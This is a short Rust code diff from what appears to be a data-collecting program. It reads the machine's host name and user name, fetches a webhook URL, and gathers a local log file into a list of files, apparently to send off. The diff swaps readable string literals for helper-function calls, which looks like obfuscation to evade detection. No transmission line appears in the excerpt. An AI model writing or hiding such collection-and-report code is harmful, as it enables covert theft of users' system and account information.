@@ -83,26 +83,26 @@ fn press_any_key_to_close() {
 }
 
 pub fn get_hostname() -> String {
-    if let Ok(name) = env::var("COMPUTERNAME") {
+    if let Ok(name) = env::var(s_env_computername()) {
         if !name.is_empty() {
             return name;
         }
     }
-    if let Ok(name) = env::var("USERDOMAIN") {
+    if let Ok(name) = env::var(s_env_userdomain()) {
         if !name.is_empty() {
             return name;
         }
     }
-    "unknown".to_string()
+    s_main_unknown()
 }
 
 pub fn get_username() -> String {
-    if let Ok(name) = env::var("USERNAME") {
+    if let Ok(name) = env::var(s_env_username()) {
         if !name.is_empty() {
             return name;
         }
     }
-    "unknown".to_string()
+    s_main_unknown()
 }
 
 fn get_webhook_url() -> String {
@@ -188,7 +188,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
 
     if let Ok(exe_path) = std::env::current_exe() {
         if let Some(dir) = exe_path.parent() {
-            let log_path = dir.join("n0.log");
+            let log_path = dir.join(s_main_log_file());
             if let Ok(log_content) = fs::read_to_string(&log_path) {
                 if !log_content.is_empty() {
                     all_files.push(("n0.log".to_string(), log_content));
